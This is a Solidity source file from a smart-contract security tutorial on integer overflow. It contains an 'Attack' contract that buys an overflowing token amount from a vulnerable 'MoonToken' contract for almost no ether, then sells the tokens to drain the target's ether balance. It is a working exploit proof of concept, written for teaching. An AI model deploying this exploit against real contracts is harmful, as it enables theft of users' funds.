// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-06-integer-overflow-e1f444f3cc4
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-06-integer-overflow/

pragma solidity 0.6.12;

interface IMoonToken {
    function buy(uint256 _tokenToBuy) external payable;
    function sell(uint256 _tokenToSell) external;
    function getEtherBalance() external view returns (uint256);
}

contract Attack {
    uint256 private constant MAX_UINT256 = type(uint256).max;
    uint256 public constant TOKEN_PRICE = 1 ether;

    IMoonToken public immutable moonToken;

    constructor(IMoonToken _moonToken) public {
        moonToken = _moonToken;
    }

    receive() external payable {}

    function calculateTokenToBuy() public pure returns (uint256) {
        // Calculate an amount of tokens that makes an integer overflow
        return MAX_UINT256 / TOKEN_PRICE + 1;
    }

    function getEthersRequired() public pure returns (uint256) {
        uint256 amountToBuy = calculateTokenToBuy();

        // Ether (in Wei) required to submit to invoke the attackBuy() function
        return amountToBuy * TOKEN_PRICE;
    }

    function attackBuy() external payable {
        require(getEthersRequired() == msg.value, "Ether received mismatch");
        uint256 amountToBuy = calculateTokenToBuy();
        moonToken.buy{value: msg.value}(amountToBuy);
    }

    function calculateTokenToSell() public view returns (uint256) {
        // Calculate the maximum Ethers that can drain out
        return moonToken.getEtherBalance() / TOKEN_PRICE;
    }

    // Maximum Ethers that can drain out = moonToken.balance / 10 ** 18 only,
    // since moonToken.decimals = 0 and 1 token = 1 Ether always
    // (The token is non-divisible. You can buy/sell 1, 2, 3, or 46 tokens but not 33.5.)
    function attackSell() external {
        uint256 amountToSell = calculateTokenToSell();
        moonToken.sell(amountToSell);
    }

    function getEtherBalance() external view returns (uint256) {
        return address(this).balance;
    }
}